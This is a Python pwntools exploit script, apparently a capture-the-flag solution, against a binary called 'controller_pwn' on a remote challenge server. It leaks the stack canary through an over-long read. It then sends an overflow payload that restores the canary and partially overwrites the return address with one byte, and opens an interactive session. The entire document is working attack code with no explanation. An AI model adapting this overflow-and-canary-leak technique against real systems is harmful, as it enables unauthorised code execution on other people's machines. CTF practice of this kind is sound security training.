#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './controller_pwn'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

debug = 0
if debug:
    io = process('./controller_pwn')
else:
    io = remote("pwn-4cab513033.challenge.xctf.org.cn", 9999, ssl=True)

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

io.send(b'a'*0x29)
io.recvuntil(b'a'*0x29)
canary = u64(b'\x00' + io.recv(7))
leak("canary", canary)
payload = flat(
    b'a'*0x28, canary, 0
)+b'\x0e'

io.send(payload)

io.interactive()
